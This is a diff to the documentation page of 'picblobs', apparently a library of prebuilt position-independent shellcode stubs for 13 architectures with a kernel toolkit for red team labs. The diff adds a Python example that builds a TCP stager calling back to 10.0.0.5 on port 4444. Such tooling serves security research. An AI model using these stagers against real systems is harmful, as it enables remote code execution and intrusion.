@@ -67,10 +67,14 @@ arbitrary payloads on multiple operating systems and architectures. Eliminates
 the need for hand-writing shellcode by providing tested, cross-platform PIC
 stubs through a simple Python API.</p>
 <h2 id="user-story">User Story</h2>
-<pre data-lang="text"><code>As a developer who needs portable PIC payload stubs, I want a tested catalog
-and builder API so I can assemble target-specific blobs without hand-writing
-assembly for every OS and architecture.
+<pre data-lang="text"><code>As a cybersecurity developer, I am sick and tired of writing assembly and shellcode.
+
+I would like prestaged payloads for all targets I touch on a regular basis to enable
+ethical security research.
 </code></pre>
+<p>The project ships prebuilt blob assets plus runners and verification tooling,
+so consumers can build configs and execute tested PIC stubs without needing to
+write per-architecture assembly.</p>
 <h2 id="whats-in-the-box">What's in the box</h2>
 <ul>
 <li><strong>13 architectures</strong>: x86_64, i686, aarch64, armv5 (ARM/Thumb), armv7, s390x, mipsel32, mipsbe32, sparcv8, powerpc, ppc64le, riscv64</li>
@@ -82,6 +86,19 @@ assembly for every OS and architecture.
 <li><strong>Bazel 9 build system</strong> with automatic Bootlin toolchain provisioning</li>
 <li><strong>Kernel toolkit</strong> for red team lab exercises</li>
 </ul>
+<h2 id="python-api">Python API</h2>
+<p>The builder API takes a target OS/architecture, configures a blob type,
+then produces the final bytes or metadata:</p>
+<pre data-lang="python"><code>import picblobs
+
+blob = (
+    picblobs.Blob(&quot;linux&quot;, &quot;riscv64&quot;)
+    .stager_tcp()
+    .address(&quot;10.0.0.5&quot;)
+    .port(4444)
+    .build()
+)
+</code></pre>
 <h2 id="verified-status">Verified status</h2>
 <p>The staged release catalog currently contains 368 blob/target entries across
 24 OS/architecture targets. Use <code>picblobs-cli verify</code> for the full end-to-end
